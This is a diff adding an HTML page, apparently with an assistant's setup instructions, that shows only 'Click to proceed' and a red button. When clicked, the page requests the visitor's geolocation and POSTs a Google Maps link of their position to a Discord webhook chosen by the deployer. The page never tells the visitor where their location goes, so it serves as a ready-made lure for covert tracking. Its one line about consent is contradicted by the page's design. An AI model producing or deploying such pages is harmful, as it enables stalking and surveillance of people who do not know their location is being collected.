@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+    <meta charset="UTF-8">    <meta name="viewport" content="width=device-width, initial-scale=1.0">    <title>Location Sender</title>
+    <style>
+        body {
+            background-color: black;
+            color: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            flex-direction: column;
+            font-family: Arial, sans-serif;} #buttonContainer {
+            display: flex;
+            flex-direction: column;
+            align-items: center;} #sendLocation {
+            background-color: red;
+            border: none;
+            border-radius: 50%;
+            width: 100px;
+            height: 100px;
+            cursor: pointer;
+            font-size: 16px;
+            color: white;
+            outline: none;
+            transition: background-color 0.3s;} #sendLocation:hover {
+            background-color: darkred;} h1 {
+            position: absolute;
+            top: 50%;
+            transform: translateY(-50%);            font-size: 24px;
+            text-align: center;} </style>
+</head>
+<body>
+    <h1>Click to proceed</h1>
+    <div id="buttonContainer">        <button id="sendLocation">•</button>
+    </div>
+    <audio id="audio" src="your-audio-file.mp3" preload="auto"></audio> <!-- Replace with your audio file -->
+
+    <script>
+        document.getElementById('sendLocation').addEventListener('click', function() {
+            // Play audio when button is pressed
+            document.getElementById('audio').play();            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendLocation, showError);} else {
+                alert("Geolocation is not supported by this browser.");} });        function sendLocation(position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            const googleMapsLink =`https://www.google.com/maps/@${lat},${lon},15z`;            const webhookUrl = 'YOUR_DISCORD_WEBHOOK_URL'; // Replace with your Discord webhook URL
+            const data = {
+                content:`User's Location:${googleMapsLink}`            };
+
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'}, body: JSON.stringify(data)            }).then(response => {
+                if (response.ok) {
+                    alert('Location sent to Discord!');} else {
+                    alert('Failed to send location.');} }).catch(error => {
+                console.error('Error:', error);            });} function showError(error) {
+            switch (error.code) {
+                case error.PERMISSION_DENIED:
+                    alert("User denied the request for Geolocation.");                    break;
+                case error.POSITION_UNAVAILABLE:
+                    alert("Location information is unavailable.");                    break;
+                case error.TIMEOUT:
+                    alert("The request to get user location timed out.");                    break;
+                case error.UNKNOWN_ERROR:
+                    alert("An unknown error occurred.");                    break;} }
+    </script>
+</body>
+</html>
+```### Instructions
+1. **Create a new HTML file**: Copy the above code into a new file and save it with a `.html` extension (e.g.,`location_sender.html`).2. **Replace the Audio Source**: Change`your-audio-file.mp3` to the path of your MP3 file. Make sure the MP3 file is accessible from the location where your HTML file is hosted.3. **Replace the Webhook URL**: Make sure to replace`YOUR_DISCORD_WEBHOOK_URL` with your actual Discord webhook URL.4. **Run the HTML file**: Open the HTML file in a web browser. You should see a black background with the text"Click to proceed" and a red circular button in the center. When you click the button, it will play the audio and request permission to access your location.5. **Check Discord**: If permission is granted, your location will be sent to the specified Discord channel as a Google Maps link.### Important Notes
+- **Button Style**: The button is styled to be a circular red button. You can adjust the size and colors as needed.- **User Consent**: Always ensure that users are aware their location is being shared and have given their consent.- **Privacy Regulations**: Be mindful of privacy laws and regulations (such as GDPR) when handling user data.
